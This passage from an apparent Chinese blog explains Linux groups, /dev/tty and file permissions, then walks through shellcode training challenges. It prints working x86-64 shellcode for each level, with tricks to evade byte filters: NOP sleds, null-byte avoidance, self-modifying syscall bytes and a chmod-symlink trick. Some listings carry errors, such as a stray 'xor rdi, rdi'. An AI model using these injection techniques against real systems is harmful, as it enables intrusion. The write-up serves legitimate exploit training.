<li>服务器进程：例如，一个Web服务器（如Apache或Nginx）运行在一个独立的进程中。它可以通过生成子进程来处理不同的客户端请求。</li>
</ul>
<p><strong>线程的例子</strong></p>
<ul>
<li>多任务处理：例如，一个文本编辑器在编辑文档的同时可以进行拼写检查和自动保存。这些任务可以在不同的线程中并行执行。</li>
<li>网络服务：例如，一个Web服务器可以为每个客户端请求分配一个线程，以便同时处理多个请求，提高响应速度。</li>
</ul>
<h3 id="6-Linux系统中组的含义"><a href="#6-Linux系统中组的含义" class="headerlink" title="6. Linux系统中组的含义"></a>6. Linux系统中组的含义</h3><p>在Linux系统中，组（group）是用户的一种分类方式，用于管理用户的权限和访问控制。每个用户可以属于一个或多个组，进而影响该用户或进程对系统资源的访问权限。进程所属的组ID列表表示该进程的所有者用户所属的所有组ID。</p>
<p><strong>组ID的含义</strong><br>组ID（GID）：每个组都有一个唯一的组ID（GID）。组ID用于标识组，就像用户ID（UID）用于标识用户一样。</p>
<p><strong>Groups 字段的含义</strong><br>在 <code>/proc/[pid]/status</code> 文件中的 <code>Groups</code> 字段列出了进程所有者所属的所有组的组ID。这些组ID决定了进程在文件系统和系统资源访问权限方面的行为。例如，如果一个文件的组所有者与进程的组ID列表中的一个匹配，那么进程将使用文件的组权限进行访问。</p>
<p>示例分析:</p>
<p>假设你看到以下 Groups 字段：</p>
<p>Groups: 4 24 27 30 46 122 135 136 1000<br>这表示该进程的所有者用户属于以下组：</p>
<pre class="line-numbers language-none"><code class="language-none">GID 4
GID 24
GID 27
GID 30
GID 46
GID 122
GID 135
GID 136
GID 1000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这些组ID对应的组名可以在 /etc/group 文件中找到。每行格式如下：group_name:x:GID:group_list</p>
<p>示例：查看组名<br>假设你有一个GID列表 4 24 27 30 46 122 135 136 1000，你想知道这些GID对应的组名，你可以查看 /etc/group 文件<code>cat /etc/group | grep -E &#39;:(4|24|27|30|46|122|135|136|1000)</code></p>
<p>示例输出可能如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adm:x:4:syslog,lebron
cdrom:x:24:lebron
sudo:x:27:lebron
dip:x:30:lebron
plugdev:x:46:lebron
lpadmin:x:122:lebron
sambashare:x:135:lebron
libvirt:x:136:lebron
lebron:x:1000:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样你就可以确定GID对应的组名了：</p>
<pre class="line-numbers language-none"><code class="language-none">GID 4: adm
GID 24: cdrom
GID 27: sudo
GID 30: dip
GID 46: plugdev
GID 122: lpadmin
GID 135: sambashare
GID 136: libvirt
GID 1000: lebron<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这些组信息对进程的访问控制有直接影响。如果某个文件的组权限设置为读/写/执行，并且该文件的组所有者是 cdrom（GID 24），那么任何属于 cdrom 组的用户（如 lebron）都可以根据组权限访问该文件。同样，如果进程需要访问某些受限资源（如设备文件），它必须运行在合适的组权限下。</p>
<h3 id="7-dev-tty是什么？"><a href="#7-dev-tty是什么？" class="headerlink" title="7. /dev/tty是什么？"></a>7. /dev/tty是什么？</h3><p><code>/dev/tty</code> 是 Unix 和类 Unix 操作系统中的一个设备文件，代表当前进程的控制终端（terminal）。下面是一些关于 <code>/dev/tty</code> 的详细解释：</p>
<p>定义和作用：</p>
<p><code>/dev/tty</code> 是一个设备文件，指向与当前进程相关联的终端设备。不论进程是通过命令行运行还是通过图形界面终端运行，<code>/dev/tty</code> 都会指向那个特定的终端设备。它用于提供标准输入、标准输出和标准错误输出的接口，使进程能够与用户进行交互。<br>历史背景：</p>
<p>“TTY” 原本是电传打字机（teletypewriter）的缩写，这是一种早期的电子通信设备。随着计算机技术的发展，“TTY” 这个术语被保留了下来，表示计算机终端或虚拟终端。<br>常见用法：</p>
<p>重定向输入输出：进程可以通过重定向标准输入、标准输出和标准错误到 /dev/tty 来确保其输出被显示在终端上。例如：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/tty"</span><span class="token punctuation">,</span> O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">dup2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将标准输出重定向到 /dev/tty</span>
    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>检查终端状态：使用 isatty 函数来检查文件描述符是否指向终端设备。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isatty</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Standard input is a terminal.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Standard input is not a terminal.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>相关设备文件：</p>
<p><code>/dev/console</code>：代表系统控制台设备，通常是系统的主要显示和输入设备。<br><code>/dev/pts/*</code>：表示伪终端设备，用于实现虚拟终端，如通过 SSH 连接的终端。<br><code>/dev/null</code>：特殊设备文件，丢弃所有写入的数据，读取时返回 EOF。<br>通过这些设备文件，Unix 和类 Unix 系统提供了一种灵活的方式来管理和使用各种终端设备，使得系统管理和编程变得更加方便和直观。</p>
<h3 id="8-系统调用的路径问题"><a href="#8-系统调用的路径问题" class="headerlink" title="8. 系统调用的路径问题"></a>8. 系统调用的路径问题</h3><p>当系统调用（如 execve、chmod 等）传入相对路径时，操作系统会根据当前工作目录解析该路径。当前工作目录是进程的属性，通常是进程启动时的目录。</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">push 0x31  &#x2F;* ASCII  &#39;1&#39; *&#x2F;
mov rdi, rsp
push 0
pop rsi
xor edx, edx
push 0x3b
pop rax
syscall

push 0x31: 将字符 &#39;1&#39; 的 ASCII 值 0x31 压入栈中。
mov rdi, rsp: 将栈指针 rsp 的当前值（此时指向字符 &#39;1&#39;）加载到寄存器 rdi 中。rdi 是 execve 系统调用的第一个参数，用于指向可执行文件路径。
push 0: 将值 0 压入栈中。
pop rsi: 将栈顶的值 0 弹出到寄存器 rsi 中。rsi 是 execve 系统调用的第二个参数，用于传递命令行参数数组（argv），这里传递空指针。
xor edx, edx: 将寄存器 edx 置零。edx 是 execve 系统调用的第三个参数，用于传递环境变量数组（envp），这里传递空指针。
push 0x3b: 将 execve 系统调用号 0x3b（59）压入栈中。
pop rax: 将栈顶的值 59 弹出到寄存器 rax 中。rax 用于存储系统调用号。
syscall: 执行系统调用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>执行效果</strong></p>
<ul>
<li>rdi 包含相对路径 “1” 的地址。</li>
<li>execve 系统调用将使用相对路径 “1”。</li>
<li>内核会根据当前工作目录解析相对路径 “1”</li>
</ul>
<h3 id="9-Linux系统文件权限"><a href="#9-Linux系统文件权限" class="headerlink" title="9. Linux系统文件权限"></a>9. Linux系统文件权限</h3><p>文件权限是 UNIX 和类 UNIX 操作系统中的一个核心概念，它们决定了谁可以读取、写入和执行文件。文件权限由三组数字组成，每组数字代表一个不同的用户类别的权限：</p>
<ul>
<li>用户（User, u）: 文件的所有者。</li>
<li>组（Group, g）: 与文件所有者同组的用户。</li>
<li>其他用户（Others, o）: 系统上所有其他用户。</li>
</ul>
<p>相当于每个用户类别由3位2进制数组成组成，最高位代表是否可读，中间位代表是否可写，最低位代表是否可以执行。</p>
<p><strong>文件权限的表示法</strong><br>文件权限可以用三位八进制数表示，每位数字代表一组权限。每个权限位的值如下：</p>
<ul>
<li>4: 读权限（r, read）</li>
<li>2: 写权限（w, write）</li>
<li>1: 执行权限（x, execute）</li>
</ul>
<p>这三种权限可以组合起来，形成不同的权限设置：</p>
<ul>
<li>7: 读、写和执行（4 + 2 + 1 = 7）</li>
<li>6: 读和写（4 + 2 = 6）</li>
<li>5: 读和执行（4 + 1 = 5）</li>
<li>4: 只有读（4）</li>
<li>3: 写和执行（2 + 1 = 3）</li>
<li>2: 只有写（2）</li>
<li>1: 只有执行（1）</li>
<li>0: 无权限（0）</li>
</ul>
<p><strong>常见权限设置</strong></p>
<p><strong>600</strong></p>
<ul>
<li><strong>用户（所有者）</strong>: 读和写（6）</li>
<li><strong>组</strong>: 无权限（0）</li>
<li><strong>其他用户</strong>: 无权限（0）</li>
</ul>
<p>权限表示：</p>
<pre class="line-numbers language-none"><code class="language-none">-rw------- (600)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>644</strong></p>
<ul>
<li><strong>用户（所有者）</strong>: 读和写（6）</li>
<li><strong>组</strong>: 读（4）</li>
<li><strong>其他用户</strong>: 读（4）</li>
</ul>
<p>权限表示：</p>
<pre class="line-numbers language-none"><code class="language-none">-rw-r--r-- (644)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>755</strong></p>
<ul>
<li><strong>用户（所有者）</strong>: 读、写和执行（7）</li>
<li><strong>组</strong>: 读和执行（5）</li>
<li><strong>其他用户</strong>: 读和执行（5）</li>
</ul>
<p>权限表示：</p>
<pre class="line-numbers language-none"><code class="language-none">-rwxr-xr-x (755)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>777</strong></p>
<ul>
<li><strong>用户（所有者）</strong>: 读、写和执行（7）</li>
<li><strong>组</strong>: 读、写和执行（7）</li>
<li><strong>其他用户</strong>: 读、写和执行（7）</li>
</ul>
<p>权限表示：</p>
<pre class="line-numbers language-none"><code class="language-none">-rwxrwxrwx (777)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h3><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>这个题可以用nasm直接编译汇编语言，我居然还在用python，写汇编语言的二进制表示然后再写入文件中。因为我卡在了不知道把字符串应该放在哪里？到底是放在baby程序的栈中，还是放在我的代码的最后部分。其实是一致的，因为你所有的输入都在baby程序的栈中，只不过位置不同。</p>
<p>nasm编译汇编语言，居然可以指定段中的数据。而且这里使用的都是系统调用，不用再通过plt段获取一些动态链接函数的地址了。</p>
<p>利用程序</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64

section .data
    filename db &#39;&#x2F;flag&#39;, 0    ; 文件路径需要替换为正确的路径

section .bss
    buffer resb 100                   ; 100 字节缓冲区

section .text
global _start

_start:
    ; open(&quot;filename&quot;, O_RDONLY)
    xor rax, rax
    mov rax, 2                        ; SYS_open
    lea rdi, [rel filename]
    xor rsi, rsi                      ; O_RDONLY &#x3D; 0
    syscall

    ; 检查 open 的返回值
    test rax, rax
    js error                          ; 如果打开文件失败，跳转到错误处理

    ; read(fd, buffer, 100)
    mov rdi, rax                      ; fd
    lea rsi, [rel buffer]
    mov rdx, 100                      ; 读取 100 字节
    xor rax, rax                      ; SYS_read
    syscall

    ; write(1, buffer, rax)
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall

    ; exit(0)
    xor rdi, rdi                      ; 返回码 0
    mov rax, 60                       ; SYS_exit
    syscall

error:
    ; exit(1)
    mov rdi, 1                        ; 返回码 1
    mov rax, 60                       ; SYS_exit
    syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>这一关相较于上一关，在shellcode运行之前，程序随机跳过开始的0x800个字节。所以我们需要在程序开始之前的0x800个字节添加NOP指令。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Executing filter...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"execute and then your real shellcode will run. This concept is called a `nop sled`.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> to_skip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x700</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
shellcode_mem <span class="token operator">+=</span> to_skip<span class="token punctuation">;</span>
shellcode_size <span class="token operator">-=</span> to_skip<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用代码</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64

section .data
    filename db &#39;&#x2F;flag&#39;, 0    ; 文件路径需要替换为正确的路径

section .bss
    buffer resb 100                   ; 100 字节缓冲区

section .text
global _start


; 在 .text 段前插入 0x800 个 nop 指令
nop_space:
    times 0x800 nop           ; 0x800 个 nop 指令

_start:
    ; open(&quot;filename&quot;, O_RDONLY)
    xor rax, rax
    mov rax, 2                        ; SYS_open
    lea rdi, [rel filename]
    xor rsi, rsi                      ; O_RDONLY &#x3D; 0
    syscall

    ; 检查 open 的返回值
    test rax, rax
    js error                          ; 如果打开文件失败，跳转到错误处理

    ; read(fd, buffer, 100)
    mov rdi, rax                      ; fd
    lea rsi, [rel buffer]
    mov rdx, 100                      ; 读取 100 字节
    xor rax, rax                      ; SYS_read
    syscall

    ; write(1, buffer, rax)
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall

    ; exit(0)
    xor rdi, rdi                      ; 返回码 0
    mov rax, 60                       ; SYS_exit
    syscall

error:
    ; exit(1)
    mov rdi, 1                        ; 返回码 1
    mov rax, 60                       ; SYS_exit
    syscall
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这一关在运行shellcode之前，baby程序判断读取内容中是否包含0x00字节，如果包含则拒绝运行。</p>
<p>我们之前的汇编代码中，字符串地址的结尾、缓冲区初始化都是0x00字节。如果使用hexdump观察的话，还有很多地址也包含0x00。所以我们不能依据之前的代码解决此关。</p>
<p>我们可以利用execve函数，在汇编语言中调用这个函数，去启动我们编写的一个读取flag的程序。</p>
<p>execve函数</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64

section .text
global _start

_start:
    jmp short call_shellcode

get_address:
    pop rdi                     ; 将字符串地址弹出到RDI中
    xor rsi, rsi                ; 清空RSI
    xor rdx, rdx                ; 清空RDX
    mov al, 0x3b                ; syscall编号execve
    syscall                     ; 执行系统调用

call_shellcode:
    call get_address            ; 调用get_address来获取字符串地址
    db &#39;&#x2F;home&#x2F;hacker&#x2F;Shellcode&#x2F;level3&#x2F;openflag&#39;               ; 存储字符串&#x2F;bin&#x2F;sh，X是占位符，避免NULL字节
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>openflag</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> filename <span class="token operator">=</span> <span class="token string">"/flag"</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>
    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buffer<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>第4关，shellcode中不然包含0x48，然后我就替换了一下level3中的汇编。把xor指令换成mov指令了。</p>
<p>还是通过execve运行openflag程序。</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64

section .text
global _start

_start:
    jmp short call_shellcode

get_address:
    pop rdi                     ; 将字符串地址弹出到RDI中
    mov rsi, 0                  ; 清空RSI
    mov rdx, 0                  ; 清空RDX
    mov al, 0x3b                ; syscall编号execve
    syscall                     ; 执行系统调用

call_shellcode:
    call get_address            ; 调用get_address来获取字符串地址
    db &#39;&#x2F;home&#x2F;hacker&#x2F;Shellcode&#x2F;level3&#x2F;openflag&#39;,0x0             ; 存储字符串&#x2F;bin&#x2F;sh，X是占位符，避免NULL字节
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>第五关shellcode中，不让包含syscall–0f05、sysenter–0f34、int–80cd这些字节。<br>但是存储代码的栈空间是可以修改，可以读写、可以运行的。所以我们的思路，可以通过在汇编运行运行的期间，动态修改后续需要执行的指令。</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">

BITS 64

section .data
    filename db &#39;&#x2F;home&#x2F;hacker&#x2F;Shellcode&#x2F;level3&#x2F;openflag&#39;,0x0             ; 存储字符串&#x2F;bin&#x2F;sh，X是占位符，避免NULL字节

section .text
    global _start

_start:
    jmp short call_code

code:
    pop rsi                      ; 将下一条指令地址保存到 rsi 寄存器--times 0x10 nop的首地址
    push rsi
    mov byte [rsi-8], 0x0f        ; 将 0x0f 写入地址 rsi-8 # 这个地址的位置就是 call rax的地址
    mov byte [rsi-7], 0x05       ; 将 0x05 写入地址 rsi-7 
    xor rax, rax                 ; 清空 rax
    mov al, 0x3b                 ; 将 59 (sys_execve) 移动到 rax
    lea rdi, [rel filename]      ; 将字符串 filename 移动到 rdi
    xor rsi, rsi                 ; 清空 rsi
    xor rdx, rdx                 ; 清空 rdx
    call rax                     ; 前面的mov byte [rsi-8], 0x0f 和 mov byte [rsi-7], 会将0x05 这个地方修改为syscall 指令
    ret

call_code:
    call code                    ; 跳转到 code 标签并将返回地址压入栈
    times 0x10 nop               ; 0x10个 nop 指令
    


&#x3D;&gt; 0x1c121004:  movb   $0xf,-0x8(%rsi)
   0x1c121008:  movb   $0x5,-0x7(%rsi)
   0x1c12100c:  xor    %rax,%rax
   0x1c12100f:  mov    $0x3b,%al
   0x1c121011:  lea    0x20(%rip),%rdi        # 0x1c121038
   0x1c121018:  xor    %rsi,%rsi
   0x1c12101b:  xor    %rdx,%rdx
   0x1c12101e:  call   *%rax
   0x1c121020:  ret
   0x1c121021:  call   0x1c121002
   0x1c121026:  nop
   0x1c121027:  nop
   0x1c121028:  nop
   0x1c121029:  nop
   0x1c12102a:  nop
   0x1c12102b:  nop
   0x1c12102c:  nop

&#x3D;&gt; 0x1c12100c:  xor    %rax,%rax
   0x1c12100f:  mov    $0x3b,%al
   0x1c121011:  lea    0x20(%rip),%rdi        # 0x1c121038
   0x1c121018:  xor    %rsi,%rsi
   0x1c12101b:  xor    %rdx,%rdx
   0x1c12101e:  syscall
   0x1c121020:  ret
   0x1c121021:  call   0x1c121002
   0x1c121026:  nop
   0x1c121027:  nop
   0x1c121028:  nop
   0x1c121029:  nop
   0x1c12102a:  nop
   0x1c12102b:  nop
   0x1c12102c:  nop
   0x1c12102d:  nop
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>跟第五关一样，不同的是，程序会收回输入的前0x1000个字节的写权限，那么我们可以在第五关的基础上，对前0x1000个字节使用nop指令进行填充。</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64

section .data
    filename db &#39;&#x2F;home&#x2F;hacker&#x2F;Shellcode&#x2F;level3&#x2F;openflag&#39;,0

section .text
    global _start

_start:
    times 0x1000 nop
    jmp short call_code

code:
    pop rsi
    push rsi
    mov byte [rsi-8], 0x0f
    mov byte [rsi-7], 0x05
    xor rax, rax
    mov al, 0x3b
    lea rdi, [rel filename]
    xor rsi, rsi
    xor rdx, rdx
    call rax
    ret

call_code:
    call code # 之所以用call指令，是因为我们要获取指令的地址。而这一步会让rip入栈，我们可以根据rip修改指令地址处的指令。达到动态修改运行指令的效果。
    times 0x10 nop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>在执行 <code>shellcode_mem</code> 前，程序关闭了标准输入<code>（stdin）</code>，标准输出<code>（stdout）</code>和标准错误输出<code>（stderr）</code>，因此在当前进程中，标准输出文件描述符 1 和标准错误输出文件描述符 2 已经被关闭。由于 execve 继承了调用它的进程的文件描述符状态，新的进程也将没有有效的标准输出和标准错误输出。</p>
<p>这个跟之前的区别是，取消了回显，也就是说，你无法通过标准输入，看到回显。那么我们就换个思路，将读取到的flag内容写入到一个文件中，然后再点击这个文件查看内容就行了。当然，你也可以将标准输出重定向到某个文件查看内容。</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64

section .text
global _start

_start:
    jmp short call_shellcode

get_address:
    pop rdi
    mov rsi, 0
    mov rdx, 0
    mov al, 0x3b
    syscall

call_shellcode:
    call get_address
    db &quot;&#x2F;home&#x2F;hacker&#x2F;Shellcode&#x2F;level7&#x2F;openflag&quot;,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> filename <span class="token operator">=</span> <span class="token string">"/flag"</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>
    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buffer<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    FILE<span class="token operator">*</span> file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/Shellcode/level7/flag.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>这个题跟之前题目的不同在于，将整体shellcode的大小限制在0x12个字节以内。之前的方法不能正常适用本关卡，因为代码大小超过了要求的大小。</p>
<p>关于系统调用的路径问题，可以看<code>问题8</code>的讲解。</p>
<p>除了这个以外，在之前的关卡中，如果我想向rdi寄存器中传入某个字符串的地址，是利用<code>lea rid [rel filename]</code>进行传递的。除了这个方法，我想不到什么别的方法。</p>
<p>通过观察论坛才发现，可以通过先<code>push 1</code>然后<code>mov rdi, rsp</code>的方式，通过栈的特点，将栈顶指针传递给<code>rdi</code>。占用的字节数少，也能达到同样的效果。除了这种获取地址的方式，给寄存器赋值，也可以使用先<code>push</code>然后<code>pop</code>的方式，这样占用的字节数也少。你要是<code>mov立即数</code>的话，至少都五六个字节。</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000002436f000 | 6a 31                                         | push 0x31
0x000000002436f002 | 48 89 e7                                      | mov rdi, rsp
0x000000002436f005 | 6a 00                                         | push 0
0x000000002436f007 | 5e                                            | pop rsi
0x000000002436f008 | 48 31 ff                                      | xor rdi, rdi
0x000000002436f00b | 6a 3b                                         | push 0x3b
0x000000002436f00d | 58                                            | pop rax
0x000000002436f00e | 0f 05                                         | syscall <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>讲解完上面的东西以后，我们可以利用<code>chmod</code>系统调用，在当前目录创建一个指向<code>flag</code>文件的符号链接<code>f</code>，然后在当前目录下将shellcode传递给babay程序，这样<code>chmod</code>系统调用会首先补全路径–<code>当前目录/f</code>，然后修改这个符号链接所指向的源文件的权限，我们修改为读就可以了。然后通过cat读取就行了。</p>
